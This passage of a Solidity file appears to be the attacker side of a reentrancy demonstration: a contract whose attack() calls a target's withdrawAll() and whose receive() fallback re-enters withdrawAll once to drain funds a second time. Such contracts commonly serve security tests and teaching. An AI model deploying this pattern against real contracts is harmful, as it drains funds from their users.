    bool private reentered;

    constructor(address _target) {
        target = C(_target);
    }

    function attack() external {
        target.withdrawAll();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            target.withdrawAll();
        }
    }
}

